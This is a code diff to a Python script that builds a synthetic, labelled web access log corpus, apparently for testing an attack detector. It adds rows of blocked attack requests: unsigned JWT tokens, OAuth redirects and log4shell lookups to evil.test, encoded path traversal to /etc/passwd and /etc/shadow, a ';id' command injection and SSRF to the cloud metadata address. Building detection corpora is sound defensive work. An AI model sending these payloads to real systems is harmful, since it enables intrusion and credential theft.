@@ -10,7 +10,7 @@ from pathlib import Path
 ROOT = Path(__file__).resolve().parents[1]
 OUT = ROOT / "corpus" / "customer_anonymized.access"
 MANIFEST = ROOT / "corpus" / "customer_anonymized_manifest.json"
-TARGET_LINES = int(os.environ.get("CUSTOMER_CORPUS_LINES", "600"))
+TARGET_LINES = int(os.environ.get("CUSTOMER_CORPUS_LINES", "800"))
 TS = "09/Jun/2026:09:15:00 +0300"
 RNG = random.Random(20260609)
 
@@ -99,6 +99,18 @@ def main() -> None:
         ("log4shell", "GET", "/api?q=${jndi:ldap://evil.test/a}", 403),
         ("nosql", "GET", "/api/kullanici?filter[$gt]=", 403),
         ("ssrf", "GET", "/proxy?url=http://169.254.169.254/latest/meta-data/", 403),
+        ("jwt_abuse", "GET", "/api/me?token=eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.", 403),
+        ("jwt_abuse", "GET", "/api/v2/hesap?bearer=eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.", 403),
+        ("jwt_alg_confusion", "GET", "/auth?jwt=eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.", 403),
+        ("jwt_alg_confusion", "GET", "/oauth/callback?token=eyJhbGciOiJIUzI1NiJ9.none.sig", 403),
+        ("api_bola", "GET", "/api/v1/siparis/99?musteri_id=1", 403),
+        ("api_abuse", "GET", "/api/v1/kullanici/2/profil?as_user=1", 403),
+        ("api_abuse", "POST", "/api/v1/admin/rol", 403, "user_id=2&role=admin"),
+        ("oauth_abuse", "GET", "/oauth/authorize?redirect_uri=https://evil.test/callback", 403),
+        ("oauth_abuse", "GET", "/oauth/token?grant_type=client_credentials&client_id=x", 403),
+        ("path_traversal_variant", "GET", "/indir?dosya=%2e%2e%2f%2e%2e%2fetc%2fpasswd", 403),
+        ("path_traversal_variant", "GET", "/dosya?yol=..%252f..%252fetc%252fpasswd", 403),
+        ("path_traversal_variant", "GET", "/export?path=....//....//etc/shadow", 403),
     ]
     for spec in attack_specs:
         cat = spec[0]
@@ -109,14 +121,25 @@ def main() -> None:
         ua = spec[5] if len(spec) > 5 else ua_browser
         add(cat, line_lg(ip(), method, path, body=body, status=status, ua=ua))
 
+  # 2026 tehditleri: api_abuse, jwt_alg, path_traversal fill dongusunde dengeli
     fill_specs = [
         ("benign", "GET", "/magaza/sayfa/{}", 200, "-"),
         ("benign", "GET", "/blog/yazi/{}", 200, "-"),
         ("sqli", "GET", "/siparis?no={}%27", 403, "-"),
         ("xss", "GET", "/profil?ad=<script>alert({})</script>", 403, "-"),
         ("lfi", "GET", "/dosya?f=....//....//etc/passwd%00", 403, "-"),
+        ("path_traversal_variant", "GET", "/static?file=%2e%2e%2fetc%2fpasswd%2f{}", 403, "-"),
+        ("jwt_abuse", "GET", "/api/oturum?token=eyJhbGciOiJub25lIn0.evil{}", 403, "-"),
+        ("jwt_alg_confusion", "GET", "/auth?jwt=eyJhbGciOiJub25lIn0.eyJhZG1pbiI6e30.{}", 403, "-"),
+        ("api_abuse", "GET", "/api/v1/admin/users/{}?elevate=1", 403, "-"),
+        ("oauth_abuse", "GET", "/oauth/authorize?redirect_uri=https://evil.test/{}", 403, "-"),
+        ("api_bola", "GET", "/api/v1/fatura/{}?hesap=other", 403, "-"),
         ("scanner", "GET", "/wp-includes/wlwmanifest.xml", 404, "WPScan/3.8.22"),
         ("brute", "POST", "/giris", 401, "kullanici=user{}&parola=fail"),
+        ("log4shell", "GET", "/api?q=${{jndi:ldap://x{}/a}}", 403, "-"),
+        ("nosql", "GET", "/api/kullanici?filter[$ne]=null{}", 403, "-"),
+        ("rce", "GET", "/cgi-bin/exec?cmd=;id%20{}", 403, "-"),
+        ("ssrf", "GET", "/proxy?url=http://169.254.169.254/meta{}", 403, "-"),
     ]
     n = 0
     while len(entries) < TARGET_LINES:
